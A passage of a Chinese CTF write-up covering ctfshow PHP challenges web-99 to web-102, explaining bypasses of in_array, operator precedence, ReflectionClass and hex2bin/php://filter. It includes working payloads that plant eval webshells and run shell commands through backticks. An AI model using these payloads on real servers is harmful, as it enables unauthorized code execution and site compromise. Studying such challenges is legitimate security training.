<p>这里就相当于a对象中的成员属性enter的值引用了a对象中成员属性secret的值，所以当secret的值改变的时候，enter依然与enter相同</p>
<hr>
<h1 id="web-99（审计、in-array、file-put-contents）"><a href="#web-99（审计、in-array、file-put-contents）" class="headerlink" title="web-99（审计、in_array、file_put_contents）"></a>web-99（审计、in_array、file_put_contents）</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$allow</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">36</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x36d</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$allow</span>, <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-variable">$i</span>));<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$allow</span>))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p> 解题思路：</p>
<ul>
<li>highlight_file(<em>file</em>)：将当前文件的代码以语法高亮的形式输出到浏览器；</li>
<li><strong>array_push()：向数组尾部插入一个或多个元素。</strong></li>
<li>在这里插入图片描述</li>
<li><strong>rand()：生成随机数。</strong></li>
<li><strong>in_array(参数1，参数2)：搜索数组中是否存在指定的值。第一个参数为要搜索的值，第二个参数为被搜索的数组。</strong></li>
<li><strong>file_put_conntent(filename, data)：把一个字符串写入文件中。</strong></li>
<li><strong>绕过in_array()：当没有指定第三个参数的时候，in_array就相当于&#x3D;&#x3D;，弱类型对比。</strong>（1.php&#x3D;&#x3D;1）</li>
<li>这段代码的总体意思就是：首先生成一个数组，数组元素随机生成（有区间），GET传参n&#x3D;1.php，POST传参content，内容为<code>&lt;?php @eval($_POST[1]);?&gt;</code></li>
</ul>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?n=<span class="hljs-number">1</span>.php<br><br>POST：content=<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>然后蚁剑连接即可拿到flag。</p>
<hr>
<h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.in-array.php">in_array()用法</a></p>
<p>in_array()函数搜索数组中是否存在指定的值。</p>
<p>语法：<code>in_array(search,array,type)</code></p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">参数					描述<br>search		必需。规定要在数组搜索的值<span class="hljs-built_in"></span><br><span class="hljs-built_in">array	</span>	必需。规定要搜索的数组<br>type		可选，如果设置该参数为true，则检查搜索的数据与数组的值的类型是否相同<br></code></pre></td></tr></table></figure>

<p><strong>type ： 类型，true全等 ，false非全等（默认）</strong></p>
<hr>
<h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-put-contents.php">file_put_contents()用法</a></p>
<ul>
<li>该函数访问文件时，遵循以下规则：</li>
<li>如果设置了 FILE_USE_INCLUDE_PATH，那么将检查 filename 副本的内置路径</li>
<li>如果文件不存在，将创建一个文件</li>
<li>打开文件</li>
<li>如果设置了 LOCK_EX，那么将锁定文件</li>
<li>如果设置了 FILE_APPEND，那么将移至文件末尾。否则，将会清除文件的内容</li>
<li>向文件中写入数据</li>
<li>关闭文件并对所有文件解锁</li>
<li>如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">file_put_contents</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$data</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-number">0</span> [, resource <span class="hljs-variable">$context</span> ]] )<br><br>filename： 必需。规定要写入数据的文件。 如果文件不存在，则创建一个新文件。<br>data： 必需。规定要写入文件的数据。可以是字符串、数组或数据流。<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-100（逻辑运算符优先级、is-numeric）"><a href="#web-100（逻辑运算符优先级、is-numeric）" class="headerlink" title="web-100（逻辑运算符优先级、is_numeric）"></a>web-100（逻辑运算符优先级、is_numeric）</h2><p>源码：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs perl">highlight_file(__FILE__);<br>include(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br><span class="hljs-regexp">//</span>flag in <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>;<br><span class="hljs-variable">$ctfshow</span> = new ctfshow();<br><span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span>=is_numeric(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> is_numeric(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> is_numeric(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-variable">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><br><br>?&gt;<br></code></pre></td></tr></table></figure>

<p><strong>解题思路：</strong></p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">$v0=is_numeric($v1)<span class="hljs-built_in"> and </span>is_numeric($v2)<span class="hljs-built_in"> and </span>is_numeric($v3);<br></code></pre></td></tr></table></figure>

<p><strong>逻辑运算符的优先级：”&amp;&amp;” &gt; “||” &gt; “&#x3D;” &gt; “and”，等号的优先级高于and，所以v0只跟v1有关系，v2和v3是干扰。</strong></p>
<p><strong>由于&#x3D;的优先级大于and，因此只要满足v1是个数字，v0就返回1</strong></p>
<p><strong>所以$v1为数字即可让$v0为True</strong></p>
<p><strong>所以,让$ctfshow显出来就行了</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-variable">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>通过代码审计，v2是不能带分号的，v3必须带一个分号</strong></p>
<p>payload：</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs smali">/?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;      //利用注释符号/**/然后输出<br>或<br>/?v1=1&amp;v2=&amp;v3=?&gt;&lt;?=`tac ctfshow.php`;      //?&gt;闭合然后反引号执行命令<br>或<br>?v1=1&amp;v2=highlight_file(&#x27;ctfshow.php&#x27;)/*&amp;v3=*/;		//通过highlight_file高亮显示输出<br>或<br>http://5ba83a33-fa36-4b9c-b091-da557c318c7f.challenge.ctf.show/?v1=1&amp;v2=eval($_POST[1])/*&amp;v3=*/;	//利用蚁剑连接<br><br>使用print_r<br>v1=1&amp;v2=print_r($ctfshow)&amp;v3=;<br></code></pre></td></tr></table></figure>

<p>注意flag的形式是ctfshow{xxx-xxx-xxx-xxx}</p>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-number">0x2d</span>      <span class="hljs-comment">//-</span><br><br><span class="hljs-keyword">ctfshow</span>&#123;<span class="hljs-number">7</span>c4e97b8<span class="hljs-number">-43</span>ba<span class="hljs-number">-48</span>af<span class="hljs-number">-8</span>dbb<span class="hljs-number">-5466</span>a0ca6796&#125;  <span class="hljs-comment">//最后一段有12位</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="逻辑运算符优先级"><a href="#逻辑运算符优先级" class="headerlink" title="逻辑运算符优先级"></a>逻辑运算符优先级</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-operators.html">逻辑运算符详解</a></p>
<p>“&amp;&amp;” &gt; “||” &gt; “&#x3D;” &gt; “and”</p>
<hr>
<h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.is-numeric.php">is_numeric函数详解</a></p>
<p>用于检测变量是否为数字或数字字符串。<br> 如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">is_numeric</span><span class="hljs-params">(mixed <span class="hljs-variable">$value</span>)</span></span>: bool<br></code></pre></td></tr></table></figure>

<p>参数</p>
<ul>
<li><code>value</code> 需要检测的变量。</li>
</ul>
<p>返回值</p>
<ul>
<li>如果 <code>value</code> 是数字或数字字符串，    返回 **<code>true</code>**，否则返回 **<code>false</code>**。</li>
</ul>
<hr>
<h2 id="web-101（ReflectionClass反射类）"><a href="#web-101（ReflectionClass反射类）" class="headerlink" title="web-101（ReflectionClass反射类）"></a>web-101（ReflectionClass反射类）</h2><p>源码：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs perl">highlight_file(__FILE__);<br>include(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br><span class="hljs-regexp">//</span>flag in <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>;<br><span class="hljs-variable">$ctfshow</span> = new ctfshow();<br><span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span>=is_numeric(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> is_numeric(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> is_numeric(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\<span class="hljs-variable">$|</span>\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\<span class="hljs-variable">$|</span>\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-variable">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>在上一题的基础上对v2和v3多了很多过滤，$和\*以及反引号都被过滤所以不可以直接输出对象ctfshow、不可以注释、不可以反引号执行。</strong></p>
<p><strong>但是还可以使用反射类的方法；</strong></p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">v1</span>=1&amp;v2=echo new ReflectionClass&amp;<span class="hljs-attribute">v3</span>=;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="ReflectionClass反射类"><a href="#ReflectionClass反射类" class="headerlink" title="ReflectionClass反射类"></a>ReflectionClass反射类</h3><p><strong>PHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。</strong></p>
<p>反射类可以说成是类的一个映射，可以利用反射类来代替有关类的应用的任何语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;123123123&#125;&quot;</span>;<br><span class="hljs-keyword">const</span>  PI=<span class="hljs-number">3.14</span>;<br><span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&lt;/br&gt;&quot;</span>;<br>&#125;<br>&#125;<br><br>/有这么一个A类，假设我们不知道这个类是干什么用的，我们需要知道类里面的信息，这时候就需要用到ReflectionClass来对类进行反射<br><span class="hljs-comment">//现在我可以通过反射来获取这个类中的方法，属性，常量</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-string">&#x27;A&#x27;</span>);	<span class="hljs-comment">//实例化反射对象,映射A类的信息</span><br><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getConstants</span>());  获取一组常量<br>输出<br> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;PI&quot;</span>]=&gt;<br>  <span class="hljs-keyword">float</span>(<span class="hljs-number">3.14</span>)<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>());    获取类名<br>输出<br><span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;A&quot;</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getStaticProperties</span>()); 获取静态属性<br>输出<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;flag&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">15</span>) <span class="hljs-string">&quot;flag&#123;123123123&#125;&quot;</span><br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getMethods</span>()); 获取类中的方法<br>输出<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">object</span>(ReflectionMethod)<span class="hljs-comment">#2 (2) &#123;</span><br>    [<span class="hljs-string">&quot;name&quot;</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;hello&quot;</span><br>    [<span class="hljs-string">&quot;class&quot;</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;A&quot;</span><br>  &#125;<br>  <br> <br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getProperties</span>());	  <span class="hljs-comment">//获取所有属性</span><br><br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-102（php伪协议、hex2bin、substr、call-user-func）"><a href="#web-102（php伪协议、hex2bin、substr、call-user-func）" class="headerlink" title="web-102（php伪协议、hex2bin、substr、call_user_func）"></a>web-102（php伪协议、hex2bin、substr、call_user_func）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v4</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v4</span>)&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v3</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>substr(string, start)：返回字符串的一部分；<br>call_user_func($callback, parameter)：调用函数，第一个参数为被调用的函数，第二个参数为被调用函数所需的参数；<br>file_put_contents(filename, data)：把data数据写入filename。<br>hex2bin()：将十六进制字符转化为ASCII码字符。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-variable">$s</span> = <span class="hljs-keyword">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$str</span> = call_user_func(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$s</span>);<br>    file_put_contents(<span class="hljs-variable">$v3</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-regexp">//</span>主要是这三句话<br>先是第二句话，让变量s过一下<span class="hljs-number">v1</span>函数，变量s 是<span class="hljs-keyword">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);   这句话的意思是从下标为<span class="hljs-number">2</span>的位置获取字符串<br>然后file_put_contents，把str变量给<span class="hljs-number">v3</span><br><br>构造思路：<br><span class="hljs-variable">$v1</span>：这里使用hex2bin()作为回调函数（<span class="hljs-number">16</span>进制转化为字符）<br><span class="hljs-variable">$v2</span>：这里要求全是数字。<br><span class="hljs-variable">$v3</span>：使用PHP伪协议写入文件<br><br><br><span class="hljs-variable">$a</span>=&lt;?=<span class="hljs-string">`cat *`</span>;<br><span class="hljs-variable">$b</span>=base64_encode(<span class="hljs-variable">$a</span>);  <span class="hljs-regexp">//</span> PD89YGNhdCAqYDs=<br><span class="hljs-variable">$c</span>=bin2hex(<span class="hljs-variable">$b</span>);      <span class="hljs-regexp">//</span>等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，=和带着                        =的base64解码出来的内容是相同的。<br>                       bin2hex是把ASCII 字符的字符串转化为<span class="hljs-number">16</span>进制<br>输出   5044383959474e6864434171594473<br>带e的话会被认为是科学计数法，可以通过is_numeric检测。<br>因为是从下标为<span class="hljs-number">2</span>的位置取的字符串，所以要在前面加两个数字（随意）<br><span class="hljs-number">v2</span>=005044383959474e6864434171594473<br></code></pre></td></tr></table></figure>

<p><strong>整个payload的逻辑就是将经过base64编码、16进制转换后的webshell赋值给v2（16进制后的shell必须为纯数字）,然后调用hex2bin将16进制形式的webshell转化为ASCII码形式（因为base64编码所用的字符属于ASCII，故ASCII码形式的webshell也就是base64形式的webshell）</strong>，然后再使用php伪协议的过滤器，将base64形式的webshell进行解码后，写入到目标文件中。</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">php7：<br>?v2=<span class="hljs-number">005044383959474e6864434171594473</span>&amp;v3=php:<span class="hljs-comment">//filter/write=convert.base64-decode/resource=1.php</span><br><br>POST：v1=hex2bin				<span class="hljs-comment">//这个就是把16进制转换为ASCII 字符的字符串</span><br>访问<span class="hljs-number">1</span>.php后查看源代码获得flag<br><br><br>php5：<br>在php5中<span class="hljs-number">16</span>进制数是可以被<span class="hljs-title function_ invoke__">is_numeric</span>()（要带<span class="hljs-number">0</span>x前缀）识别的，所以可以绕过<span class="hljs-title function_ invoke__">is_numeric</span>()，但是php7不行，<br>所以如果这题是php5环境<br>所以先用<span class="hljs-title function_ invoke__">bin2hex</span>()将<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span>转为<span class="hljs-number">16</span>进制编码<br><span class="hljs-number">0x3c3f706870206576616c28245f504f53545b315d293b3f3e</span><br><br>?v2=<span class="hljs-number">0x3c3f706870206576616c28245f504f53545b315d293b3f3e</span>&amp;v3=<span class="hljs-number">1</span>.php<br>这里不需要填充两个字符，而且hex2bin可以直接解码<span class="hljs-number">16</span>进制编码<br><br>POST：v1=hex2bin<br>然后蚁剑连接<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func函数具体详解</a></p>
<p><code>call_user_func($callback, parameter)</code>：调用函数，第一个参数为被调用的函数，第二个参数为被调用函数所需的参数；</p>
<p>第一个参数是必须的，第二个参数可选</p>
<p>call_user_func支持传入数组，且可以用数组来调用静态方法</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ans</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-variable">$ans</span>[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$ans</span>);<br><br><span class="hljs-comment">#输出</span><br>flag<br></code></pre></td></tr></table></figure>



<hr>
